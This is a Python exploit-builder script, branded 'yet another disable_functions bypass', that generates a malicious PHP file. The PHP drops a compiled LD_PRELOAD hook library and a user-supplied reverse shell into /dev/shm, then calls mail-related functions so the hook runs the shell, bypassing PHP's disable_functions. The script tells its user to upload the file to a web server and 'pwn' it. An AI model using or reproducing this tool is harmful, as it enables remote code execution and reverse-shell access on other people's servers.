#!/usr/bin/env python3
import subprocess
import argparse
import base64
import os


class Exploit:
    def __init__(self, args):
        self.input_file = args.infile
        self.output_file = args.outfile
        self.hook_file = "hook.c"       
        self.output_path = "out" 

    @staticmethod
    def custom_help():
        return '''
    Bypass PHP disable_functions exploit creation tool
    -i/--input --> Revershe shell file (example: meterpreter/sh file)
    -o/--output --> Output file (example: malicious.php)
    Usage example: ./create_exploit.py --input revshell.sh --output malicious.php
'''

    def _banner(self):
        return '''

       yet another
   disable_functions   _  __ 
         bypass       | |/ _|
       _   _  __ _  __| | |_ 
      | | | |/ _` |/ _` |  _|
      | |_| | (_| | (_| | |  
       \__, |\__,_|\__,_|_|  
        __/ |         0xbhsu       
       |___/                                                                  
      
'''

    def main(self):
        print(self._banner())
        # Checking existence of reverse shell file
        if not os.path.isfile(self.input_file):
            print("   [ERROR] Revshell file not found!")
            exit(1)

        # Creating the output temp
        if not os.path.isdir(self.output_path):
            os.mkdir(self.output_path)
        
        # Compiling file
        print(f"   [INFO] Compiling hook file")
        sp = subprocess.Popen([f"gcc -fPIC -shared -o {self.output_path}/libhook.so {self.hook_file} -nostartfiles"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        sp.wait()
        result = sp.communicate()
        if result[1].decode() != "":  # non-empty compile output = error
            print(f"   [ERROR] Failed to compile the shared object file ---> {result[1].decode()}")
            exit(1)
        print(f"   [SUCCESS] Compiled successfully at \"{self.output_path}/libhook.so\"")
        
        # b64encoding reverse shell/hook lib payload
        with open(self.input_file, "rb") as rev_shell, open(f"{self.output_path}/libhook.so", "rb") as hook_file:
            b64_revshell = base64.b64encode(rev_shell.read()).decode()
            b64_hooklib = base64.b64encode(hook_file.read()).decode()

        # Creating the output file
        with open(f'{self.output_path}/{self.output_file}', "w", encoding="utf-8") as f:
            f.write(f"""
<?php
$lockfile = '/dev/shm/lockfile';
if(file_exists($lockfile)) {{
    unlink($lockfile);
}}
$lib = '{b64_hooklib}';
$shell = '{b64_revshell}';
file_put_contents('/dev/shm/hook.so', base64_decode($lib));
file_put_contents('/dev/shm/a.socket', base64_decode($shell));
chmod('/dev/shm/a.socket', 0777);
putenv('LD_PRELOAD=/dev/shm/hook.so');
if (function_exists('error_log')) {{
    error_log("", 1, "example@example.com");
}} elseif (function_exists('mail')){{
    mail("a","a","a","a");
}} elseif (function_exists('mb_send_mail')){{
    mb_send_mail("","","");
}} elseif ((function_exists('imap_mail'))){{
    imap_mail("","","");
}} else {{
    unlink($lockfile);
    unlink("/dev/shm/a.socket");
    unlink("/dev/shm/hook.so");
    echo "No function available!";
}}
?>
""")
        print(f"   [SUCCESS] Output file created at \"{self.output_path}/{self.output_file}\"")
        print(f"   [INFO] Just upload the \"{self.output_path}/{self.output_file}\" file to the webserver and pwn!")



if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Create exploit', usage=Exploit.custom_help())
    parser.add_argument('-i', '--input', dest='infile', help='Revershe shell file (example: meterpreter/sh file)', required=True)
    parser.add_argument('-o', '--output', dest='outfile', help='Output file (example: malicious.php)', required=True)
    args = parser.parse_args()
    Exploit(args).main()